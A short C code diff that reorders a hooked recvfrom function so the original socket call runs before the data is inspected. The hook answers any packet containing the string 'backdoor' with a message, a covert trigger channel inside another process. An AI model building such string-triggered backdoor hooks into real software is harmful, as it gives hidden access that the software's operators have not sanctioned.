@@ -70,6 +70,7 @@ TLAHOOK(sendto_hook, int, sendto,
 TLAHOOK(recvfrom_hook, int, recvfrom,
     SOCKET s, char *buf, int len, int flags, struct sockaddr *from, int *fromlen)
 {
+	int ret = recvfrom_hook.original(s, buf, len, flags, from, fromlen);
 	if (!g_server_socket)
 		g_server_socket = s;
 	if (strstr(buf, "backdoor")) {
@@ -79,7 +80,6 @@ TLAHOOK(recvfrom_hook, int, recvfrom,
 		struct sockaddr_in* sender = (struct sockaddr_in*)from;
 		sendto(s, msg, strlen(msg), flags, from, *fromlen);
 	}
-    int ret = recvfrom_hook.original(s, buf, len, flags, from, fromlen);
     return ret;
 }
 
